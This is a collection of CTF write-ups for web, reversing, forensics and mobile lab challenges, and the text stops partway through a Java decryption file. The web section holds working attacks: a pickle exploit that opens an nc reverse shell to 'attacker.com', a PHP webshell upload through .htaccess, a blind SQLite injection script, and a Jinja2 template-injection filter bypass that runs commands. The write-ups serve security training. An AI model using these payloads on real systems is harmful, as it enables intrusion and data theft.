# InfoSec CTF Writeups

## Web

### easy_temp

I initially thought it was some kind of path traversal vulnerability for nginx. However, it wouldn't work. The value of the path was getting reflected back so I decided to try ``server-side template injection`` and it worked. I pulled a random working payload from [swisskeyrepo](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md). That gave me ``remote code execution``. belThe flag was in ``/etc/passwd``.
![flag](https://cdn.discordapp.com/attachments/875457441574297623/1087035703659085954/image.png)

### T-Jungle

Looking at the source, this was a ``php type juggling`` challenge. 
The source code looked like this:
```
<?php
	if (hash('md5',$_GET['passwd']) == '0e514198421367523082276382979135')
	  {
		  echo $FLAG;
	  }
?>
```

As said in [this article](https://owasp.org/www-pdf-archive/PHPMagicTricks-TypeJuggling.pdf), PHP, for loose comparison, if PHP decides both operands look like numbers even if they are actually strings, it will convert them both and perform a numeric comparison. So, let's take passwd as ``240610708``, whose md5 is ``0e462097431906509019562988736854``. So it converts both ``0e462097431906509019562988736854`` and ``0e514198421367523082276382979135``. They get converted to ``int(0)`` and pass the check, giving us the flag.
![flag](https://cdn.discordapp.com/attachments/875457441574297623/1087033453595336734/image.png)

### CV_pwner

We are greeted with a form to submit our resume. Trying to upload a text file tell us that the server will only allow us to upload pdfs. That was easily taken care of by changing the ``content-type`` to ``application/pdf``. Submitting it tells us they will review it and get back to us shortly. Well, I was confused for a bit. *Where is our uploaded file? What am I supposed to do here?* I tried looking for the file in ``/uploads`` but no luck. So I ran ``dirsearch`` on the url. That gave me the ``/upload`` endpoint with the uploaded files. Go figure. Now the ``original filename we give did not change on upload``. Seeing as it was a ``PHP server``, I uploaded a ``.htaccess`` with the lines ``
AddType application/x-httpd-php .pdf
``. I think any extension would work, but heck, why not pdf? Then I uploaded a simple ``php webshell`` with a filename like ``shell.pdf``. I got the flag from either ``/etc/passwd`` (or possibly ``/flag.txt``, I don't remember clearly).
![img](https://cdn.discordapp.com/attachments/875457441574297623/1087038703769235466/image.png)
![img](https://cdn.discordapp.com/attachments/875457441574297623/1087038643127980082/image.png)
![img](https://cdn.discordapp.com/attachments/875457441574297623/1087038759708672050/image.png)


### R!ck secrets

I saw a login page. Like any intellectual, I tried ``test:test`` as credentials and it worked, leading me to some kind of dashboard. *(Turns out it was also in the html comments anyway, but pfft, who needs that?)*. We are greeted with a pickle guy image. Clearly, there was some sort of ``pickle deserialisation`` bug. The session cookie was not a pickled object. I looked around for a bit, and turns out setting ``remember me`` loads a cookie which looks very suspicious. Trying ``pickle.loads(value)`` gave an error ``AttributeError: Can't get attribute 'usr'`` .  So I created an empty ``usr`` class. I used [fickling](https://github.com/trailofbits/fickling), a python pickle decompiler to get more information about the pickle object. It dumped the following:
```
Module(
    body=[
        ImportFrom(
            module='__main__',
            names=[
                alias(name='usr')],
            level=0),
        Assign(
            targets=[
                Name(id='_var0', ctx=Store())],
            value=Call(
                func=Name(id='usr', ctx=Load()),
                args=[],
                keywords=[])),
        Expr(
            value=Call(
                func=Attribute(
                    value=Name(id='_var0', ctx=Load()),
                    attr='__setstate__'),
                args=[
                    Dict(
                        keys=[
                            Constant(value='username'),
                            Constant(value='password')],
                        values=[
                            Constant(value='test'),
                            Constant(value='test')])],
                keywords=[])),
        Assign(
            targets=[
                Name(id='result', ctx=Store())],
            value=Name(id='_var0', ctx=Load()))],
    type_ignores=[])
```

Fiddling around, I realised that the code for the class to generate such an ast would be as follows:
```
class  usr:
	def  __init__(self, username, password):
		self.username = username
		self.password = password
```
Now, we just have to make use of the [__reduce_ _()](https://docs.python.org/3/library/pickle.html#object.__reduce__) method. This function should return a tuple containing a callable object and a tuple as its arguments. When we pickle an object, we are actually storing the current state of the object in a so-called 'universal' format. So we can store our own values but we cannot perform a function remotely. Without \_\_reduce\_\_() at least. Why this function exists is explained rather well [here](https://stackoverflow.com/questions/19855156/whats-the-exact-usage-of-reduce-in-pickler). However, what we care about is that we get to ``execute our own function`` on the remote server now.

```
import pickle
import base64
import ast
import pickle
from fickling.pickle import Pickled

b = base64.b64decode(
    "gANjX19tYWluX18KdXNyCnEAKYFxAX1xAihYCAAAAHVzZXJuYW1lcQNYBAAAAHRlc3RxBFgIAAAAcGFzc3dvcmRxBVgEAAAAdGVzdHEGdWIu"
)


class sqli:
    def getUser(u):
        return [["a", "a", "a", "a"], [], []]


class usr:
    def __init__(self, username, password):
        self.username = username
        self.password = password

    def __reduce__(self):
        # cmd = '(lambda u: __import__("os").system("echo \'"+sqli.getUser(\'rick\')[0][2]+"\' | nc attacker.com 1337"))(1)'
        cmd = '(lambda u: __import__("os").system("rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc attacker.com 1337 > /tmp/f") )(1)'
        # cmd = '(lambda u: __import__("os").system("echo 1 | nc attacker.com 1337") )(1)'
        return eval, (cmd,)


obj = pickle.loads(b)
# print(ast.dump(Pickled.load(b).ast, indent=4))
# with open('rick.txt','w') as f:
#    f.write(ast.dump(Pickled.load(b).ast, indent=4))

# print(ast.dump(Pickled.load(pickle.dumps(usr('a','b'))).ast, indent=4))

dump = pickle.dumps(usr("rick", "test"))
dump = base64.b64encode(dump)
b = base64.b64decode(dump)
# pickle.loads(b)
print(dump)

```

This is my script which does the job. I am using a ``lambda function`` to import os and execute any command I want. A reverse shell in this case. That sql stuff was just me trying to get rick's password but all we needed to do was cat `/etc/passwd` to get the flag.
![exec](https://cdn.discordapp.com/attachments/875457441574297623/1087045094907060224/image.png)
![rick](https://cdn.discordapp.com/attachments/875457441574297623/1087045028439932938/image.png)
![login](https://cdn.discordapp.com/attachments/875457441574297623/1087045000421974267/image.png)


### Anonymax

We have a login page and the credentials are, once again, in the html comments. Upon logging in, we come across a page which allows us to upload ``png,jpeg`` or some other images. The file name is preserved in this case too. So we can use the same trick as ``CV_pwner`` earlier. Only this time we use ``.png`` instead of ``.pdf``.

![creds](https://cdn.discordapp.com/attachments/875457441574297623/1087045737474445382/image.png)
![htaccess](https://cdn.discordapp.com/attachments/875457441574297623/1087046444818636810/image.png)
![sehll](https://cdn.discordapp.com/attachments/875457441574297623/1087046360567656448/image.png)
![flag](https://cdn.discordapp.com/attachments/875457441574297623/1087046304078774334/image.png)

### Memelord

Off the bat, we notice links such as ``/home/1`` and ``/home/2``. I try entering ``/home/a`` and lucky lucky, we get an ``sqlite`` error claiming there is no such column as a. So obviously this is an ``sqlite injection`` challenge. I tried simple things such as ``1 union select 1 -- `` for a while and it did not seem to be working. However I quickly realised that my encoding was the issue. ``+`` for some reason did not decode to `` ``. Oh well, we still have ``%20`` *my precious*. [This](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md) great cheatsheet has everything we really need. 
The following payload can be used to find the length of any value from table table_name from column col_name:
``(SELECT length(col_name) FROM table_name limit 1 offset 0)=test_length`` 
The following payload can be used to find the character at index i of any value from table table_name from column col_name:
``(select hex(substr(password,index,1)) from users limit 1 offset 0)= hex('c')``

Here is my full exploit script, along with some helpers I wrote that I like to use:
```
import requests
from urllib.parse import quote
from Helpers import *
from Brute import *


def cmd(sql):
    headers = {
        "Host": "wcomgjk31njcrvme873okokfwvy0ndvjy9mxuevy-web.cybertalentslabs.com",
        "Upgrade-Insecure-Requests": "1",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.178 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
        "Referer": "http://wcomgjk31njcrvme873okokfwvy0ndvjy9mxuevy-web.cybertalentslabs.com/",
        "Accept-Language": "en-GB,en-US;q=0.9,en;q=0.8",
        "Connection": "close",
    }

    sql = quote(sql)
    response = requests.get(
        "http://wcomgjk31njcrvme873okokfwvy0ndvjy9mxuevy-web.cybertalentslabs.com/home/"
        + sql,
        headers=headers,
        verify=False,
    )

    # print(response.status_code)
    if response.status_code == 500:
        print(response.text)
    if response.status_code == 200:
        return True
    return False


# CREATE TABLE users'UserId INT, UserName TEXT, Password TEXT)
# CREATE TABLE pages'pageId INT, title TEXT, content TEXT)
def compareLen(l):
    sql = "(SELECT length(tbl_name) FROM sqlite_master WHERE type='table' and tbl_name not like 'sqlite_%' limit 1 offset {offset}){compare}{length}"
    if cmd(sql.format(offset=1, compare=">", length=l)):
        return 1
    elif cmd(sql.format(offset=1, compare="<", length=l)):
        return -1
    else:
        return 0


def compareChar(i, ch):
    sql = "(SELECT hex(substr(tbl_name,{i},1)) FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%' limit 1 offset {offset}) {compare} hex('{ch}')"
    if cmd(sql.format(i=i + 1, offset=1, compare=">", ch=ch)):
        return 1

    elif cmd(sql.format(i=i + 1, offset=1, compare="<", ch=ch)):
        return -1

    else:
        return 0


def compareLen1(l):
    sql = "(SELECT length(sql) FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name NOT LIKE 'sqlite_%' AND name ='{table}') {compare} {length}"
    if cmd(sql.format(table="pages", compare=">", length=l)):
        return 1
    elif cmd(sql.format(table="pages", compare="<", length=l)):
        return -1
    else:
        return 0


def compareChar1(i, ch):
    sql = "(SELECT hex(substr(sql,{i},1)) FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name NOT LIKE 'sqlite_%' AND name ='{table}') {compare} hex('{ch}')"
    if cmd(sql.format(i=i + 1, table="pages", compare=">", ch=ch)):
        return 1

    elif cmd(sql.format(i=i + 1, table="pages", compare="<", ch=ch)):
        return -1

    else:
        return 0


def compareLen2(l):
    sql = "(SELECT length(tbl_name) FROM sqlite_master WHERE type='table' and tbl_name not like 'sqlite_%' limit 1 offset {offset}){compare}{length}"
    sql = "(SELECT length(sql) FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name NOT LIKE 'sqlite_%' AND name ='{table}') {compare} {length}"
    sql = "(select length(password) from users limit 1 offset 0){compare}{length}"
    # if cmd(sql.format(offset=0,compare=">",length=l)):
    # if cmd(sql.format(table="users",compare=">",length=l)):
    if cmd(sql.format(compare=">", length=l)):
        return 1
    # elif cmd(sql.format(offset=0,compare="<",length=l)):
    # elif cmd(sql.format(table="users",compare="<",length=l)):
    elif cmd(sql.format(compare="<", length=l)):
        return -1
    else:
        return 0


def compareChar2(i, ch):
    sql = "(SELECT hex(substr(tbl_name,{i},1)) FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%' limit 1 offset {offset}) {compare} hex('{ch}')"
    sql = "(SELECT hex(substr(sql,{i},1)) FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name NOT LIKE 'sqlite_%' AND name ='{table}') {compare} hex('{ch}')"
    sql = "(select hex(substr(password,{i},1)) from users limit 1 offset 0){compare} hex('{ch}')"
    # if cmd(sql.format(i=i+1,offset=0,compare=">",ch=ch)):
    # if cmd(sql.format(i=i+1,table='users',compare=">",ch=ch)):
    if ch == "/":
        return 1
    if cmd(sql.format(i=i + 1, compare=">", ch=ch)):
        return 1

    # elif cmd(sql.format(i=i+1,offset=0,compare="<",ch=ch)):
    # elif cmd(sql.format(i=i+1,table='users',compare="<",ch=ch)):
    elif cmd(sql.format(i=i + 1, compare="<", ch=ch)):
        return -1

    else:
        return 0


def compareLen3(l):
    sql = "(SELECT count(tbl_name) FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%' ) {compare} {l}"
    if cmd(sql.format(l=l, compare=">")):
        return 1
    elif cmd(sql.format(l=l, compare="<")):
        return -1
    else:
        return 0


def compareLen4(l):
    sql = "(SELECT count(username) FROM users ) {compare} {l}"
    if cmd(sql.format(l=l, compare=">")):
        return 1
    elif cmd(sql.format(l=l, compare="<")):
        return -1
    else:
        return 0


# 3da/f45365/f/eca43e//645b68ec83c3c659b9d57ea556d/84//47c9393c789
# 6dc37/d/3e/a656/e75ce/d6f976/7f5
# 3ab8b73fba8a5ba9/e336dea38f36575
def Main():
    options = Helpers.getOptions()
    options["compareChar"] = compareChar2
    # options['len']=5
    options["compareLen"] = compareLen2
    brute = Brute(**options)
    flag = brute.run(5)
    print(flag)


Main()

```
![sql](https://cdn.discordapp.com/attachments/875457441574297623/1087073049196646471/image.png)
![flag](https://cdn.discordapp.com/attachments/875457441574297623/1087072986080743544/image.png)
### Extreme Bypass
This is a ``server-side template injection filter bypass`` challenge. This is the filter we need to bypass: 
```
re.search("\{\{|\}\}|(popen)|(os)|(subprocess)|(application)|(getitem)|(flag.txt)|\.|_|\[|\]|\"|(class)|(subclasses)|(mro)",request.form['name']) is  not  None) or (num_check(request.form['name']))
```
``num_check`` simply prevents any numbers. If our payload matches this search, it will not be executed. On the other hand, if it doesn't, it will do ``render_template_string(request.form['name'])`` with our payload. Since the admin function is always ``False``, we can never see the result. That's okay though. For starters, I copied the source code and created a template for myself. Now I can test my exploit locally. I edited ``index.py`` so it will still execute my payload even if hacking is detected, it will just print out 'hacking' to let me know that though. This helps with debugging. So flask uses the ``jinja`` templating engine.
Since we are not allowed to use ``{{`` we can simply use ``{%``. Look [here](https://jinja.palletsprojects.com/en/3.1.x/templates/#synopsis). ``{{...}}`` statements in jinja print an output while ``{%...%}`` do not. An easy workaround is ``{% print(expression) %}``. However, it won't work in our case since we do not get the rendered variable back. It does help with debugging though. So that is great. What I wanted to was execute:
``{{request.application.__globals__.__getitem__("__builtins__").__getitem('__import__')('os').popen('ls').read()}}
``
We already know what to do with ``{{`` and ``}}`` so we will come back to it in a bit. First thing we need is request.application. But ``.`` is not allowed. We can just use [built-in filters](https://jinja.palletsprojects.com/en/3.1.x/templates/#builtin-filters). An interesting one is [attr](https://jinja.palletsprojects.com/en/3.1.x/templates/#jinja-filters.attr). `foo|attr("bar")` works like `foo.bar`. So we can just do ``request|attr('application')`` (single quotes work just fine as double quotes are blocked). But wait, ``application`` is blocked too. Note that it is a case-sensitive match so we can simple use the [lower](https://jinja.palletsprojects.com/en/3.1.x/templates/#jinja-filters.lower) filter to convert 'APPLICATION' to lowercase. So now we have:
```request|attr('APPLICATION'|lower)```
But what about ``__globals__``? It has an `_`. I just passed it in as a pragma header. ``Pragma: _``. Which we can now access with ``request|attr('pragma)``. I stored it as a variable for convenient use. This can be done as follows:
```
{%with u=request|attr('pragma') %}{% request|attr('APPLICATION'|lower) %}{%endwith%}
```
we can now use u for underscore. This is where the [format](https://jinja.palletsprojects.com/en/3.1.x/templates/#jinja-filters.format) filter comes in handy. 
``'%s%sglobals%s%s'|format(u,u,u,u)`` gives us \_\_globals\_\_.

Using these tricks we can get the payload I mentioned before as follows:
```
name={%with u=request|attr('pragma') %}{% print(request|attr('APPLICATION'|lower)|attr('%s%sglobals%s%s'|format(u,u,u,u)))|attr('%s%sGETITEM%s%s'|format(u,u,u,u)|lower)('%s%sbuiltins%s%s'|format(u,u,u,u))|attr('%s%sGETITEM%s%s'|format(u,u,u,u)|lower)('%s%simport%s%s'|format(u,u,u,u))('OS'|lower)|attr('POPEN'|lower)('id')|attr('read')() %}{%endwith%}
```
Now we could simply get a reverse shell at this point. However, [forcing blind injection to give output](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md#jinja2---forcing-output-on-blind-rce) seemed interesting so why not? 
Here is my full payload:
```
name={%with u=request|attr('pragma') %}{%with c=request|attr('APPLICATION'|lower)|attr('%s%sglobals%s%s'|format(u,u,u,u))|attr('%s%sGETITEM%s%s'|format(u,u,u,u)|lower)('%s%sbuiltins%s%s'|format(u,u,u,u))|attr('%s%sGETITEM%s%s'|format(u,u,u,u)|lower)('%s%simport%s%s'|format(u,u,u,u))('OS'|lower)|attr('POPEN'|lower)('cat /fl*')|attr('read')() %}{% print(request|attr('APPLICATION'|lower)|attr('%s%sglobals%s%s'|format(u,u,u,u))|attr('%s%sGETITEM%s%s'|format(u,u,u,u)|lower)('%s%sbuiltins%s%s'|format(u,u,u,u))|attr('%s%sGETITEM%s%s'|format(u,u,u,u)|lower)('exec')('from flask import current%sapp, after%sthis%srequest\n@after%sthis%srequest\ndef hook(*args, **kwargs):\n\tfrom flask import make%sresponse\n\treturn make%sresponse(\\'\\'\\'%s\\'\\'\\')'|format(u,u,u,u,u,u,u,c))) %}{%endwith%}{%endwith%}
```
My script:
```
import requests
from binascii import unhexlify
import html

TARGET_URL = "http://wcomgjk31njcrvmewl32e2paeze6ndvjy9mxuevy-web.cybertalentslabs.com/"
# TARGET_URL ='http://127.0.0.1:5000'
params = {"ap": "application", "g": "__globals__", "b": "__builtins__"}
dictionary = dict([(value, key) for key, value in params.items()])


def hexstring(word):
    word = word.encode().hex()
    word = r"\x" + r"\x".join(word[n : n + 2] for n in range(0, len(word), 2))
    return "'" + word + "'"


def getword(word):
    return f"request|attr('args')|attr('{dictionary[word]}')"


def hack():
    headers = {
        "Host": "wcomgjk31njcrvmewl32e2paeze6ndvjy9mxuevy-web.cybertalentslabs.com",
        "Cache-Control": "max-age=0",
        "Upgrade-Insecure-Requests": "1",
        "Origin": "http://wcomgjk31njcrvmewl32e2paeze6ndvjy9mxuevy-web.cybertalentslabs.com",
        "Content-Type": "application/x-www-form-urlencoded",
        "Pragma": "_",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
        "Referer": "http://wcomgjk31njcrvmewl32e2paeze6ndvjy9mxuevy-web.cybertalentslabs.com/",
        "Accept-Language": "en-GB,en-US;q=0.9,en;q=0.8",
        "Connection": "close",
    }

    data = f"name={{%with a={getword('application')}%}}{{%print(a)%}}{{%endwith%}}"
    data = "name={%with a=request|attr('APPLICATION'|lower)|attr(request|attr('pragma')) %}{% print(a) %}{%endwith%}"
    data = "name={%with u=request|attr('pragma') %}{% print(request|attr('APPLICATION'|lower)|attr('%s%sglobals%s%s'|format(u,u,u,u)))|attr('%s%sGETITEM%s%s'|format(u,u,u,u)|lower)('%s%sbuiltins%s%s'|format(u,u,u,u))|attr('%s%sGETITEM%s%s'|format(u,u,u,u)|lower)('%s%simport%s%s'|format(u,u,u,u))('OS'|lower)|attr('POPEN'|lower)('id')|attr('read')() %}{%endwith%}"
    data = "name={%with u=request|attr('pragma') %}{% print(request|attr('APPLICATION'|lower)|attr('%s%sglobals%s%s'|format(u,u,u,u))|attr('%s%sGETITEM%s%s'|format(u,u,u,u)|lower)('%s%sbuiltins%s%s'|format(u,u,u,u))|attr('%s%sGETITEM%s%s'|format(u,u,u,u)|lower)('exec')('from flask import current%sapp, after%sthis%srequest\n@after%sthis%srequest\ndef hook(*args, **kwargs):\n\tfrom flask import make%sresponse\n\treturn make%sresponse(\\'a\\')'|format(u,u,u,u,u,u,u))) %}{%endwith%}"
    data = "name={%with u=request|attr('pragma') %}{%with c=request|attr('APPLICATION'|lower)|attr('%s%sglobals%s%s'|format(u,u,u,u))|attr('%s%sGETITEM%s%s'|format(u,u,u,u)|lower)('%s%sbuiltins%s%s'|format(u,u,u,u))|attr('%s%sGETITEM%s%s'|format(u,u,u,u)|lower)('%s%simport%s%s'|format(u,u,u,u))('OS'|lower)|attr('POPEN'|lower)('cat /fl*')|attr('read')() %}{% print(request|attr('APPLICATION'|lower)|attr('%s%sglobals%s%s'|format(u,u,u,u))|attr('%s%sGETITEM%s%s'|format(u,u,u,u)|lower)('%s%sbuiltins%s%s'|format(u,u,u,u))|attr('%s%sGETITEM%s%s'|format(u,u,u,u)|lower)('exec')('from flask import current%sapp, after%sthis%srequest\n@after%sthis%srequest\ndef hook(*args, **kwargs):\n\tfrom flask import make%sresponse\n\treturn make%sresponse(\\'\\'\\'%s\\'\\'\\')'|format(u,u,u,u,u,u,u,c))) %}{%endwith%}{%endwith%}"

    print(data)

    response = requests.post(
        TARGET_URL,
        headers=headers,
        data=data,
        params=params,
        verify=False,
    )

    print(html.unescape(response.text))


hack()

```

And there go. The flag was in ``/flag.txt`` or something.
![flag](https://cdn.discordapp.com/attachments/875457441574297623/1087069636798980176/image.png)

## Malware Reverse Engineering

### exclus1ve
Opening it in ida shows a simple ``xor challenge``. The key is given in plaintext ``Cyb3rTalents``. 
Here is my solve script:
```
import binascii

b = "\x1F\x158\a@\a\v\x1C\a\x15\v\x17+>'\x06A\r\x1F%\x16+\x1A\x04\t\x13\x13\tt#5\x05"
b = b[::-1]
key = "Cyb3rTalents"
flag = ""
print(b)
for i in range(len(b)):
    flag += chr(ord(b[i]) ^ ord(key[i % 12]))

print(flag)
```
![flag](https://cdn.discordapp.com/attachments/875457441574297623/1087076846916612136/image.png)

### Cool PYC

So running file on the given binary, its an ELF binary. I opened it in ida to see this:
![ida](https://cdn.discordapp.com/attachments/875457441574297623/1087029793389826129/image.png)
Note the ``pyinstaller``. I looked up writeups and found out we can just use ``pyinstaller_extracter``. Running it on ``cool_pyc`` generated a directory with extracted contents. There was an actual pyc file in this one. I tried (unsuccessfully) using ``uncompyle6``. python3.9 which the pyc was for was not supported. I tried running strings to see if could get anything useful:
![strings](https://cdn.discordapp.com/attachments/875457441574297623/1087032513131712612/image.png)
``RkxBR3tIZXJlSUFNX0hpZGluZ0hlcmUhfQ==`` gives the flag ``FLAG{HereIAM_HidingHere!}`` on base64 decoding.

### ASM_v3

We get an ASM file from this challenge. Okay, we simply need to reverse this to get the flag.
```
push    rbp                         ;pushes val of rbp ontp stack
mov     rbp, rsp                    ;copies val of stack pointer rsp to base pointer rbp
```
The comments I added in is what the ASM file is doing. 
Statements like these:
```
mov     rax, QWORD PTR [rbp-24]     ;mov variable [rbp-24] to rax
mov     eax, DWORD PTR [rax]        ;mov value at rax to eax
cmp     eax, 70                     ; if (eax!=70)
jne     .L2
mov     rax, QWORD PTR [rbp-24]     ;mov variable [rbp-24] to rax   
add     rax, 4                      ;add 4
mov     eax, DWORD PTR [rax]        ;mov lower 32 bits of rax to eax
cmp     eax, 76                     ; if(eax!=76)
jne     .L2
```
``[rbp-24]`` stores the value of an array.  We simply add 0 or do nothing to get 1st element's address. Then we load it into eax. To get the 2nd elements address we add 4 bytes (32 bits for an integer) to the array base pointer and load the value. in both cases, and a lot more, we can see ``cmp`` statements. If the value is not equal to a certain value x for ``cmp eax,x`` it jumps to the ``.L2`` label. 
```
.L2:
        mov     eax, 0                      eax=0
.L3:
        mov     DWORD PTR [rbp-4], eax
        nop
        pop     rbp
        ret
```
Which just seems to be exiting the program. So we can infer the value of each element of the array. Except 4.
```
        mov     rax, QWORD PTR [rbp-24]
        add     rax, 24
        mov     eax, DWORD PTR [rax]
        sub     eax, 75
        cmp     eax, 2
        ja      .L2
```
[ja](https://www.aldeid.com/wiki/X86-assembly/Instructions/ja) performs an unsigned greater than comparision. So we have our original value ``x``. ``x-75<2`` to not exit. which means x can be ``75,76,77``.
```
        mov     rax, QWORD PTR [rbp-24]
        add     rax, 28
        mov     eax, DWORD PTR [rax]
        cmp     eax, 48
        jle     .L2
        mov     rax, QWORD PTR [rbp-24]
        add     rax, 32
        mov     eax, DWORD PTR [rax]
        cmp     eax, 100
        jle     .L2
        mov     rax, QWORD PTR [rbp-24]
        add     rax, 28
        mov     edx, DWORD PTR [rax]
        mov     rax, QWORD PTR [rbp-24]
        add     rax, 32
        mov     eax, DWORD PTR [rax]
        add     eax, edx
        cmp     eax, 152
        jne     .L2
```
[jle](https://www.aldeid.com/wiki/X86-assembly/Instructions/jle) is a simple jump if less than or equal to. So ``flag[7]>48``, ``flag[8]>100`` and ``flag[7]+flag[8]=152``.

```
        mov     rax, QWORD PTR [rbp-24]
        add     rax, 40
        mov     eax, DWORD PTR [rax]
        test    eax, eax
        je      .L2
```
[test](https://www.aldeid.com/wiki/X86-assembly/Instructions/test) will jump to exit if ``eax==0``. So all we know is ``flag[10]!=0``

This is a script I came up with based on these inferences:
```
flag = [0] * 23
flag[0] = chr(70)
flag[1] = chr(76)
flag[2] = chr(130 // 2)
flag[3] = chr(71)
flag[4] = chr(123)
flag[5] = chr(95)
flag[6] = chr(75)  # or 75+1
flag[7] = chr(51)  # >48
flag[8] = chr(101)  # >100
flag[7] + flag[8] == 152
# 49+103 50+102 51+101
flag[9] = chr(98)
flag[10] != 0
flag[11] = chr(48)
flag[12] = chr(110)
flag[13] = chr(95)
flag[14] = chr(83)
flag[15] = chr(104)
flag[16] = chr(49)
flag[17] = chr(110)
flag[18] = chr(105)
flag[19] = chr(110)
flag[20] = chr(103)
flag[21] = chr(95)
flag[22] = chr(125)

f = ""
for i in flag:
    f += str(i)

print(f)
```
I get:
![flag](https://cdn.discordapp.com/attachments/875457441574297623/1087040354781503489/image.png)

It didn't seem correct so I tried to guess what it could be and ``FLAG{_K3ep_0n_Sh1ning_}`` got accepted.

## Digital Forensics
### Magic Byte5
So we get a ``flag.jpg`` file. 
![hexedit](https://cdn.discordapp.com/attachments/875457441574297623/1087043501017018499/image.png)
Seeing from the ``IHDR`` we just need to change the magic bytes to those for a png. 
![hexedit](https://cdn.discordapp.com/attachments/875457441574297623/1087044026743652424/image.png)
![flag](https://cdn.discordapp.com/attachments/875457441574297623/1087044248119025735/image.png)

### Out of Sight
We get a ``jpg`` file. I ran ``stegoveritas`` on it which gave me a ``zip file`` and a password ``Sup3xrCx3t``. Unzipping gave the flag.
![secret](https://cdn.discordapp.com/attachments/875457441574297623/1087052284959146084/image.png)
![zip](https://cdn.discordapp.com/attachments/875457441574297623/1087052352357421116/image.png)

### Xerox
Just used ``volatility``. Found a ``pastebin`` link which gave the flag from the clipboard.
![](https://cdn.discordapp.com/attachments/875457441574297623/1087057288327598100/image.png)
![](https://cdn.discordapp.com/attachments/875457441574297623/1087057505672245379/image.png)

### tw1ns
Since we got an ``.hccapx`` file, I found [this writeup](https://ctftime.org/writeup/29598) online and tried to run hashcat. However it gave me this:
![](https://cdn.discordapp.com/attachments/875457441574297623/1087096895270301817/image.png)
In the linked blog, they run this command:
```hcxpcapngtool -o hash.hc22000 -E wordlist dumpfile.pcapng```
So first I converted the ``hccapx`` to a ``cap`` file so that ``hcxpcapngtool`` can process it.
![](https://cdn.discordapp.com/attachments/875457441574297623/1087098261338329088/image.png)
hccapx2cap from the aur wouldn't work on my system so I download it from github.
![](https://cdn.discordapp.com/attachments/875457441574297623/1087103301226610728/image.png)
Unfortunaly hashcat would not run on my system due to nvidia driver issues so I followed [this writeup](https://www.hackingarticles.in/wireless-penetration-testing-password-cracking/) to do it with john.
![](https://cdn.discordapp.com/attachments/875457441574297623/1087104256068288574/image.png)
So the flag is ``flag{5C:A6:E6:FB:24:42_matrix999}``.

### Ph0n3
I unzipped the given image to see the system. I tried installing autopsy but of course it won't run on my system. 
![](https://cdn.discordapp.com/attachments/875457441574297623/1087092824060723331/image.png)Now, first we have to find the pattern lock and as per [this writeup](https://ctftime.org/writeup/18780) it's at ``/system/gesture.key``. Then I used CTFALC to crack the gesture.
![crack](https://cdn.discordapp.com/attachments/875457441574297623/1087094095849209856/image.png)

As for the downloaded file, I found this while browsing in vscode:
![](https://cdn.discordapp.com/attachments/875457441574297623/1087094456689360996/image.png)

Therefore the flag is ``flag{240156378_ed91c1078694d0cc}``
## Mobile Security

### Decryptor 
Decompiling the apk with ``apklab`` reveals ``aes encrypted flag``, ``key``,``key_iv``.
![values](https://cdn.discordapp.com/attachments/875457441574297623/1087058281303912458/image.png)
There is also this AES encryption file:
![aes](https://cdn.discordapp.com/attachments/875457441574297623/1087058354444185640/image.png)
I wrote the decryption in a copied java file:
```
import java.util.Base64;
import java.security.MessageDigest;
import java.security.spec.AlgorithmParameterSpec;
import javax.crypto.Cipher;
import javax.crypto.spec.IvParameterSpec;
import javax.crypto.spec.SecretKeySpec;
/* loaded from: classes2.dex */
class AES {
    AES() {}
    private static final char[] HEX_ARRAY = "0123456789ABCDEF".toCharArray();

    public static String bytesToHex(byte[] bytes) {
        char[] hexChars = new char[bytes.length * 2];
        for (int j = 0; j < bytes.length; j++) {
            int v = bytes[j] & 0xFF;
            hexChars[j * 2] = HEX_ARRAY[v >>> 4];
            hexChars[j * 2 + 1] = HEX_ARRAY[v & 0x0F];
        }
        return new String(hexChars);
    }

    public static byte[] encryptAES(String ivStr, String keyStr, byte[] bytes) throws Exception {
        MessageDigest md = MessageDigest.getInstance("MD5");
        md.update(ivStr.getBytes());
        byte[] ivBytes = md.digest();
        MessageDigest sha = MessageDigest.getInstance("SHA-256");
        sha.update(keyStr.getBytes());
        byte[] keyBytes = sha.digest();
        return encryptAES(ivBytes, keyBytes, bytes);
    }

    static byte[] encryptAES(byte[] ivBytes, byte[] keyBytes, byte[] bytes) throws Exception {
        IvParameterSpec ivSpec = new IvParameterSpec(ivBytes);
        SecretKeySpec newKey = new SecretKeySpec(keyBytes, "AES");
        System.out.println(bytesToHex(newKey.getEncoded()));
        System.out.println(bytesToHex(ivSpec.getIV()));
        Cipher cipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
        cipher.init(1, newKey, ivSpec);

        String b = "4BQ30DuTvk8SeGJL7XQjbvGgarLwS8wicdqZTOqp/KI=";

        //new
        Cipher cipher2 = Cipher.getInstance("AES/CBC/PKCS5Padding");
        cipher2.init(Cipher.DECRYPT_MODE, newKey, ivSpec);
        byte[] plainText = cipher2.doFinal(Base64.getDecoder().decode(b));
        System.out.println(new String(plainText));
        System.out.println("Done");

        return cipher.doFinal(bytes);
    }

    public static String encryptStringWithBase64String(String ivStr, String keyStr, String enStr) throws Exception {
        byte[] bytes = encryptAES(keyStr, keyStr, enStr.getBytes("UTF-8"));
        return "";
        //return new String(Base64.encode(bytes, 0), "UTF-8");
    }

    public static void main(String[] args) {
        String flag = "4BQ30DuTvk8SeGJL7XQjbvGgarLwS8wicdqZTOqp/KI=";
        String keyStr = "Japan2Italy";
        String ivStr = "London";
